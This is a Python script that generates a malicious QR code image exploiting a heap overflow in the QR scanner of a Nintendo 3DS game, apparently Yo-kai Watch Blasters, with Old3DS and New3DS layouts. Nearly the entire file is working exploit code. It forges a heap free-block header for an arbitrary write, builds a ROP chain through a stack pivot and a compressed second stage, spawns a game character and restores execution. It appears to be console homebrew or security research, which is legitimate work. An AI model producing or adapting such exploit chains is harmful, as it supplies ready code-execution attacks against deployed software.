#!/usr/bin/env python3
import argparse
import os
import struct
from dataclasses import dataclass

import qrcode
import qrcode.base
import qrcode.util
from PIL import Image
from qrcode.constants import ERROR_CORRECT_L
from qrcode.util import BitBuffer, create_bytes

# QR result buffer and adjacent heap blocks.
B = 0x326D4924
P = B + 0x40
N = B + 0x997B4
H0 = B - 0x1C0628

N_CAP = 0x00001058
N_FLAGS = 0x04070000
NEXT_BLOCK_ADDR = N + 0x28 + N_CAP


# Layout-specific addresses and output names.
@dataclass(frozen=True)
class Layout:
    qr_node: int
    qr_request: int
    output: str

    @property
    def target_ref(self) -> int:
        return self.qr_node + 0x08


LAYOUTS = {
    "old3ds": Layout(
        qr_node=0x08E314AC,
        qr_request=0x08E31874,
        output="ywb_qr_poc.png",
    ),
    "new3ds": Layout(
        qr_node=0x08E314AC + 0x03C00000,
        qr_request=0x08E31874 + 0x03C00000,
        output="ywb_qr_poc_new3ds.png",
    ),
}

# Game objects
DEV = 0x006B8A60
LOOP_OBJECT = 0x006B8028
LOOP_MANAGER = 0x006B9A30
LOOP_MANAGER_R6 = LOOP_MANAGER + 0x58

# Game data
YOKAI_PARAM_ID = 0xA3A68AA8  # Jibanyan

# Functions and ROP gadgets for this game version.
PIVOT = 0x0011E5A8  # Context load and stack pivot
POP_R0_TO_R3_R10_PC = 0x0019F1C0  # POP {R0-R3,R10,PC}
STR_R0_R1 = 0x0010AF40  # STR R0,[R1]; BX LR
FREE_BLOCK_FUNC = 0x0013F9E4  # Insert/coalesce a free block.
DECOMPRESS_FUNC = 0x0016734C  # LZ10 decompress(dst, &out_size, capacity, src)
CREATE_YOKAI_FUNC = 0x003747E8  # Create a yokai; incoming R0 is unused.
RET_LR = 0x0056FE20  # BX LR
LOOP_END_REQUEST_FUNC = 0x0056D828  # Queue closure of the license registration Loop
LIST_DISPATCH_FUNC = 0x0056C41C  # Release remaining QR-owned resources
LIST_DISPATCH_A2 = 1
LIST_DISPATCH_A3 = 1080
CLEAR_QR_MODE = 0x0050537C  # LDR R0,[R5]; BIC R0,R0,#0x100000; STR R0,[R5] // Clear the QR mode flag
QR_MODE_FLAG = 0x006BC6FC

# Return stack and registers.
EXIT_SP = 0x0FFFFF38
EXIT_PC = 0x0024E0C0
EXIT_R9 = 0xFFFFFFFE
EXIT_R10 = 0xFFFFFFFF

# Payload object layout.
INITIAL_STACK_OFF = 0x078
FREE_STACK_OFF = 0x0A8
YOKAI_STACK_OFF = 0x0C0
LOOP_STACK_OFF = 0x0D8
SECOND_STACK_OFF = 0x0F0
CLEAR_RET_OFF = 0x108
FREE_CTX_OFF = 0x130
YOKAI_CTX_OFF = 0x170
LOOP_CTX_OFF = 0x1B0
SECOND_CTX_OFF = 0x1F0
EXIT_CTX_OFF = 0x230
OBJ_LEN = 0x270

# QR image configuration.
QR_VERSION = 16
QR_ECC = ERROR_CORRECT_L
QR_MASK = 1

PREFIX_LEN = 0x1B
STAGE1_OBJ_LEN = 0x60
STAGE1_BLOB_OFF = 0x60
STAGE2_CAP = (OBJ_LEN + 3) & ~3
DST = B + 0x400
OUT_SIZE = B + 0x3FC


def p32(buf, off, val):
    struct.pack_into("<I", buf, off, val)


def build_fake_object(layout: Layout, base: int):
    b = bytearray(OBJ_LEN)

    def frame(off, r0, r1, r2, r3, pc):
        p32(b, off + 0x00, r0)
        p32(b, off + 0x04, r1)
        p32(b, off + 0x08, r2)
        p32(b, off + 0x0C, r3)
        p32(b, off + 0x10, 0)
        p32(b, off + 0x14, pc)

    # PIVOT: SP=+0x34, LR=+0x38, PC=+0x3C.
    p32(b, 0x34, base + INITIAL_STACK_OFF)
    p32(b, 0x38, POP_R0_TO_R3_R10_PC)
    p32(b, 0x3C, POP_R0_TO_R3_R10_PC)

    # [N] = Dev, then enter the free-block context.
    frame(INITIAL_STACK_OFF, DEV, N, 0, 0, STR_R0_R1)
    frame(0x090, base + FREE_CTX_OFF, 0, 0, 0, PIVOT)

    # Return frames: free N -> create yokai -> loop end -> list dispatch -> QR clear.
    frame(FREE_STACK_OFF, base + YOKAI_CTX_OFF, 0, 0, 0, PIVOT)
    frame(YOKAI_STACK_OFF, base + LOOP_CTX_OFF, 0, 0, 0, PIVOT)
    frame(LOOP_STACK_OFF, base + SECOND_CTX_OFF, 0, 0, 0, PIVOT)
    frame(SECOND_STACK_OFF, 0, 0, 0, 0, CLEAR_QR_MODE)

    # QR clear: POP {R4-R6,PC}, then POP {R0-R3,R10,PC}.
    p32(b, CLEAR_RET_OFF + 0x00, 0)  # R4
    p32(b, CLEAR_RET_OFF + 0x04, 0)  # R5
    p32(b, CLEAR_RET_OFF + 0x08, 0)  # R6
    p32(b, CLEAR_RET_OFF + 0x0C, POP_R0_TO_R3_R10_PC)
    frame(CLEAR_RET_OFF + 0x10, base + EXIT_CTX_OFF, 0, 0, 0, PIVOT)

    # free N: R0=Dev, R1=N.
    p32(b, FREE_CTX_OFF + 0x00, DEV)
    p32(b, FREE_CTX_OFF + 0x04, N)
    p32(b, FREE_CTX_OFF + 0x34, base + FREE_STACK_OFF)
    p32(b, FREE_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
    p32(b, FREE_CTX_OFF + 0x3C, FREE_BLOCK_FUNC)

    # create yokai: R1=0, R2=YOKAI_PARAM_ID, R3=0.
    p32(b, YOKAI_CTX_OFF + 0x04, 0)
    p32(b, YOKAI_CTX_OFF + 0x08, YOKAI_PARAM_ID)
    p32(b, YOKAI_CTX_OFF + 0x0C, 0)
    p32(b, YOKAI_CTX_OFF + 0x34, base + YOKAI_STACK_OFF)
    p32(b, YOKAI_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
    p32(b, YOKAI_CTX_OFF + 0x3C, CREATE_YOKAI_FUNC)

    # Queue closure of the license registration Loop: request=(E+0x958)|1, manager=E+0x1A08.
    p32(b, LOOP_CTX_OFF + 0x00, LOOP_OBJECT)
    p32(b, LOOP_CTX_OFF + 0x34, base + LOOP_STACK_OFF)
    p32(b, LOOP_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
    p32(b, LOOP_CTX_OFF + 0x3C, LOOP_END_REQUEST_FUNC)

    # Release remaining QR-owned resources (E, 1, 1080).
    p32(b, SECOND_CTX_OFF + 0x00, LOOP_OBJECT)
    p32(b, SECOND_CTX_OFF + 0x04, LIST_DISPATCH_A2)
    p32(b, SECOND_CTX_OFF + 0x08, LIST_DISPATCH_A3)
    p32(b, SECOND_CTX_OFF + 0x10, 0)  # R4
    p32(b, SECOND_CTX_OFF + 0x14, QR_MODE_FLAG)  # R5
    p32(b, SECOND_CTX_OFF + 0x34, base + SECOND_STACK_OFF)
    p32(b, SECOND_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
    p32(b, SECOND_CTX_OFF + 0x3C, LIST_DISPATCH_FUNC)

    # Exit context: resume at 0x24E0C0.
    p32(b, EXIT_CTX_OFF + 0x00, 0)
    p32(b, EXIT_CTX_OFF + 0x04, 0)
    p32(b, EXIT_CTX_OFF + 0x10, layout.qr_node)
    p32(b, EXIT_CTX_OFF + 0x14, layout.qr_request)
    p32(b, EXIT_CTX_OFF + 0x18, LOOP_MANAGER_R6)
    p32(b, EXIT_CTX_OFF + 0x1C, 0)
    p32(b, EXIT_CTX_OFF + 0x20, 0)
    p32(b, EXIT_CTX_OFF + 0x24, EXIT_R9)
    p32(b, EXIT_CTX_OFF + 0x28, EXIT_R10)
    p32(b, EXIT_CTX_OFF + 0x2C, layout.qr_node)
    p32(b, EXIT_CTX_OFF + 0x34, EXIT_SP)
    p32(b, EXIT_CTX_OFF + 0x38, EXIT_PC)
    p32(b, EXIT_CTX_OFF + 0x3C, RET_LR)

    return b


def build_fake_heap_header(layout: Layout):
    b = bytearray(40)
    # fake free block: fd/bk unlink writes P to [qr_node+8].
    p32(b, 0x00, 0)
    p32(b, 0x04, H0)
    p32(b, 0x08, NEXT_BLOCK_ADDR)
    p32(b, 0x18, N_CAP)
    p32(b, 0x1C, N_FLAGS)
    p32(b, 0x20, P)
    p32(b, 0x24, layout.target_ref - 0x20)
    return b


def lz10_compress(data):
    # Greedy LZ10: 3..18-byte matches, 12-bit displacement.
    out = bytearray()
    flags = 0
    flag_count = 0
    tokens = bytearray()
    i = 0
    n = len(data)
    while i < n:
        best_len = 0
        best_disp = 0
        start = max(0, i - 4096)
        for j in range(i - 1, start - 1, -1):
            if data[j] != data[i]:
                continue
            length = 0
            while (length < 18 and i + length < n
                   and data[j + length] == data[i + length]):
                length += 1
            if length > best_len:
                best_len = length
                best_disp = i - j
                if length == 18:
                    break
        if best_len >= 3:
            flags |= 0x80 >> flag_count
            disp = best_disp - 1
            tokens.append(((best_len - 3) << 4) | (disp >> 8))
            tokens.append(disp & 0xFF)
            i += best_len
        else:
            tokens.append(data[i])
            i += 1
        flag_count += 1
        if flag_count == 8:
            out.append(flags)
            out.extend(tokens)
            flags = 0
            flag_count = 0
            tokens.clear()
    if flag_count:
        out.append(flags)
        out.extend(tokens)
    return bytes(out)


def build_compressed_blob(stage2):
    # Level-5 block header: (decompressed size << 3) | 1 (LZ10).
    data = lz10_compress(stage2)
    return struct.pack("<I", (len(stage2) << 3) | 1) + data


def build_stage1(stack_addr):
    b = bytearray(STAGE1_OBJ_LEN)
    # [P]=P+0x20; [[P]+0x0C]=[P+0x2C]=PIVOT.
    p32(b, 0x00, P + 0x20)
    for off in range(0x20, STAGE1_OBJ_LEN, 4):
        p32(b, off, RET_LR)
    p32(b, 0x2C, PIVOT)
    p32(b, 0x34, stack_addr)
    p32(b, 0x38, POP_R0_TO_R3_R10_PC)
    p32(b, 0x3C, POP_R0_TO_R3_R10_PC)
    return b


def build_first_segment(layout: Layout):
    stage2 = build_fake_object(layout, DST)
    blob = build_compressed_blob(stage2)

    stage1_off = PREFIX_LEN
    blob_off = stage1_off + STAGE1_OBJ_LEN
    blob_end = blob_off + len(blob)
    # The decompressor uses 0x40 bytes below SP.
    stack_off = blob_end + 0x40
    while (B + 37 + stack_off) & 3:
        stack_off += 1
    stack_addr = B + 37 + stack_off

    stage1 = build_stage1(stack_addr)
    first = bytearray(stack_off + 0x30)
    first[0:PREFIX_LEN] = b'\xEC' * PREFIX_LEN
    first[stage1_off:stage1_off + len(stage1)] = stage1
    first[blob_off:blob_off + len(blob)] = blob

    # Stage-1 stack: decompressor frame, then the PIVOT frame into stage 2.
    # R0=dst, R1=&out_size, R2=capacity, R3=src.
    p32(first, stack_off + 0x00, DST)
    p32(first, stack_off + 0x04, OUT_SIZE)
    p32(first, stack_off + 0x08, STAGE2_CAP)
    p32(first, stack_off + 0x0C, P + STAGE1_BLOB_OFF)
    p32(first, stack_off + 0x10, 0)
    p32(first, stack_off + 0x14, DECOMPRESS_FUNC)
    p32(first, stack_off + 0x18, DST)
    p32(first, stack_off + 0x1C, 0)
    p32(first, stack_off + 0x20, 0)
    p32(first, stack_off + 0x24, 0)
    p32(first, stack_off + 0x28, 0)
    p32(first, stack_off + 0x2C, PIVOT)
    return first


def build_declared_lengths(total):
    remaining = total
    out = []
    while remaining > 65535:
        out.append(65535)
        remaining -= 65535
    out.append(remaining)
    return out


def build_bitstream(layout: Layout):
    bits = []
    segment = build_first_segment(layout)

    def put(val, n):
        for i in range(n - 1, -1, -1):
            bits.append((val >> i) & 1)

    put(0b0100, 4)
    put(len(segment), 16)
    for by in segment:
        put(by, 8)
    for count in build_declared_lengths(N - (B + 37) - len(segment)):
        put(0b0011, 4)
        put(0, 4)
        put(0, 4)
        put(0, 8)
        put(0b0100, 4)
        put(count, 16)
    put(0b0100, 4)
    put(40, 16)
    for by in build_fake_heap_header(layout):
        put(by, 8)
    put(0b0000, 4)
    while len(bits) % 8:
        bits.append(0)
    out = bytearray()
    for i in range(0, len(bits), 8):
        v = 0
        for j in range(8):
            v = (v << 1) | bits[i + j]
        out.append(v)
    return out


def build_image(layout: Layout):
    scale = 8
    border = 4
    rs = qrcode.base.rs_blocks(QR_VERSION, QR_ECC)
    cap = sum(block.data_count for block in rs)
    data = build_bitstream(layout)
    i = 0
    while len(data) < cap:
        data.append(0xEC if i % 2 == 0 else 0x11)
        i += 1

    def custom_create_data(version, error_correction, data_list):
        # Keep the callback signature; encode the prepared data instead of data_list.
        buf = BitBuffer()
        for by in data:
            buf.put(by, 8)
        return create_bytes(buf, qrcode.base.rs_blocks(version, error_correction))

    qrcode.util.create_data = custom_create_data
    qr = qrcode.QRCode(version=QR_VERSION, error_correction=QR_ECC, box_size=1,
                       border=0, mask_pattern=QR_MASK)
    qr.make(fit=False)
    modules = qr.modules

    dim = (len(modules) + 2 * border) * scale
    W, H = 1280, 1280
    img = Image.new("L", (W, H), 255)
    ox = (W - dim) // 2
    oy = (H - dim) // 2
    for y, row in enumerate(modules):
        for x, dark in enumerate(row):
            if dark:
                x0 = ox + (x + border) * scale
                y0 = oy + (y + border) * scale
                for dy in range(scale):
                    for dx in range(scale):
                        img.putpixel((x0 + dx, y0 + dy), 0)
    here = os.path.dirname(os.path.abspath(__file__))
    img.save(os.path.join(here, layout.output))


def main():
    parser = argparse.ArgumentParser(description="Generate the YWB PoC QR image.")
    parser.add_argument("--layout", choices=tuple(LAYOUTS), default="old3ds")
    args = parser.parse_args()
    build_image(LAYOUTS[args.layout])


if __name__ == "__main__":
    main()
